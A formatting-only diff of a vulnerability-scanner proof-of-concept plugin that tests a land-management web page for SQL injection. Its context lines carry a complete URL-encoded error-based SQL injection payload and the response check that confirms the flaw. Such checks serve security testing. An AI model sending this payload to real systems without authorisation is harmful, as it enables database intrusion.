@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -50,7 +51,7 @@ class Poc(ABPoc):
             vun_url = arg+"/ExtWebModels/LandManage/ShowLandInfo.aspx?id=1"
             payload = "%27%20AND%20%28SELECT%208004%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%281%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27jvyT%27%20LIKE%20%27jvyT"
             code, head, res, errcode, finalurl = hh.http(vun_url+payload)
-            #print  res
+            # print  res
             if "c4ca4238a0b923820dcc509a6f75849b" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
